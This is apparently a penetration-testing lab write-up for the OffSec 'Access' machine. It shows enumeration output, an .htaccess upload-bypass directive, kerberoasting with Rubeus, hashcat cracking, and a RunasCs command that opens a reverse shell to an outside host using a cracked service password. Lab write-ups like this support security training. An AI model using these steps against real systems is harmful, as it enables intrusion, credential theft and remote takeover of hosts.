#### ***Enumeration***

```
nxc smb 192.168.233.187                               
SMB         192.168.233.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False)
```

```
nmap -sVC -T4 -oN Access_namp 192.168.233.187

Nmap scan report for 192.168.233.187
Host is up (0.41s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-07 05:03:37Z)
135/tcp  open  msrpc?
139/tcp  open  netbios-ssn?
389/tcp  open  ldap
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.94SVN%I=7%D=9/6%Time=66DBDEA9%P=aarch64-unknown-linux-g
SF:nu%r(GetRequest,5,"\x83\0\0\x01\x8f")%r(GenericLines,5,"\x83\0\0\x01\x8
SF:f")%r(HTTPOptions,5,"\x83\0\0\x01\x8f")%r(RTSPRequest,5,"\x83\0\0\x01\x
SF:8f")%r(RPCCheck,5,"\x83\0\0\x01\x8f")%r(DNSVersionBindReqTCP,5,"\x83\0\
SF:0\x01\x8f")%r(DNSStatusRequestTCP,5,"\x83\0\0\x01\x8f")%r(Help,5,"\x83\
SF:0\0\x01\x8f")%r(SSLSessionReq,5,"\x83\0\0\x01\x8f")%r(TerminalServerCoo
SF:kie,5,"\x83\0\0\x01\x8f")%r(TLSSessionReq,5,"\x83\0\0\x01\x8f")%r(Kerbe
SF:ros,5,"\x83\0\0\x01\x8f")%r(X11Probe,5,"\x83\0\0\x01\x8f")%r(FourOhFour
SF:Request,5,"\x83\0\0\x01\x8f")%r(LPDString,5,"\x83\0\0\x01\x8f")%r(LDAPS
SF:earchReq,5,"\x83\0\0\x01\x8f")%r(LDAPBindReq,5,"\x83\0\0\x01\x8f")%r(SI
SF:POptions,5,"\x83\0\0\x01\x8f")%r(LANDesk-RC,5,"\x83\0\0\x01\x8f")%r(Ter
SF:minalServer,5,"\x83\0\0\x01\x8f")%r(NCP,5,"\x83\0\0\x01\x8f")%r(NotesRP
SF:C,5,"\x83\0\0\x01\x8f")%r(JavaRMI,5,"\x83\0\0\x01\x8f")%r(WMSRequest,5,
SF:"\x83\0\0\x01\x8f")%r(oracle-tns,5,"\x83\0\0\x01\x8f")%r(ms-sql-s,5,"\x
SF:83\0\0\x01\x8f")%r(afp,5,"\x83\0\0\x01\x8f")%r(giop,5,"\x83\0\0\x01\x8f
SF:");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-07T05:05:49
|_  start_date: N/A

```

Accessed the port 80 and discovered a event website running.

![Web-Event](Pasted%20image%2020260107184617.png)

![htaccess](Pasted%20image%2020260107191828.png)

```
AddType application/x-httpd-php .shell
```

![dork](Pasted%20image%2020260107185229.png)

![shell](Pasted%20image%2020260107193120.png)

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u "https://192.168.233.187/FUZZ" -ac -t 500 --fc 403,404  

______________________________________________

uploads                 [Status: 301, Size: 346, Words: 22, Lines: 10, Duration: 310ms]
assets                  [Status: 301, Size: 345, Words: 22, Lines: 10, Duration: 318ms]
forms                   [Status: 301, Size: 344, Words: 22, Lines: 10, Duration: 311ms]
:: Progress: [26583/26583] :: Job [1/1] :: 466 req/sec :: Duration: [0:00:45] :: Errors: 7160 ::

```

![rshl](Pasted%20image%2020260107204338.png)

#### ***Initial Access***

![apache](Pasted%20image%2020260107204452.png)

![users](Pasted%20image%2020260107204519.png)

#### ***Privilege Escalation***


```
.\rubeus.exe kerberoast /nowrap
```

![rbs](Pasted%20image%2020260107210429.png)

```
hashcat ms_sql_kerb /usr/share/wordlists/rockyou.txt --force
```

![hcrckd](Pasted%20image%2020260107210727.png)


![rcs](Pasted%20image%2020260107211154.png)

![svc-sql](Pasted%20image%2020260107211309.png)


![local](Pasted%20image%2020260107211346.png)


![privs](Pasted%20image%2020260107212452.png)

```
./rcs.exe svc_mssql trustno1 cmd.exe -r 192.168.45.155:4444
```

![smv](Pasted%20image%2020260107220527.png)

![icls](Pasted%20image%2020260107220614.png)




---
										Target compromised - |^| ^ ( |< 3 D